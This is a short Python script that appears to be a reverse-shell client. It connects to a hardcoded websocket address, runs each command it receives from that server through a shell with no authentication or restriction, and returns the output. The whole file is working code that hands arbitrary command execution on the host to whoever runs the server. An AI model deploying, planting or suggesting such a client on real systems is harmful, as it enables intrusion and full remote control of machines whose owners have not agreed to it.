import asyncio
import websockets
import subprocess


async def handle_command(command):
    try:
        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        # Capture the output and return it
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)


async def listen(uri):
    async with websockets.connect(uri) as websocket:
        while True:
            # Wait for a command from the websocket
            command = await websocket.recv()
            print(f"Received command: {command}")

            # Handle the command
            result = await handle_command(command)
            print(f"Command result: {result}")

            # Optionally send back the result
            await websocket.send(result)


if __name__ == "__main__":
    uri = "ws://192.168.1.20:8765"
    asyncio.get_event_loop().run_until_complete(listen(uri))
